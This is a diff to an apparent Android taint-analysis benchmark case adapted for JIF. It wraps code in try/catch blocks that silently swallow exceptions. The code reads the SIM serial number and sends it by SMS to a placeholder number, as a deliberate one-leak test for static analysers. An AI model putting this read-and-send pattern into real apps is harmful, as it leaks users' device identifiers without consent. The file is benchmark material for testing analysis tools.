@@ -20,6 +20,7 @@ import jif.runtime.Runtime;
  * @dataflow onStartCommand: source -> secret; onLowMemory: secret -> sink
  * @number_of_leaks 1
  * @challenges the analysis must be able to handle the service lifecycle correctly 
+	* ADAPTACIONES: - Excepciones NullPointerException, ClassCastException
  */
 public class MainService extends Service {
 
@@ -27,8 +28,12 @@ public class MainService extends Service {
 
     @Override
     public int onStartCommand{}(Intent {}intent, int {}flags, int {}startId) {
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        secret = telephonyManager.getSimSerialNumber();
+        try {
+            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            secret = telephonyManager.getSimSerialNumber();
+        } catch (NullPointerException e) {
+        } catch (ClassCastException ignore) {
+        }
         return 0;
     }
 
@@ -39,7 +44,10 @@ public class MainService extends Service {
 
     @Override
     public void onLowMemory{}() {
-        SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("+49 1234", null, secret, null, null);
+        try {
+            SmsManager sms = SmsManager.getDefault();
+            sms.sendTextMessage("+49 1234", null, secret, null, null);
+        } catch (NullPointerException e) {
+        }
     }
 }
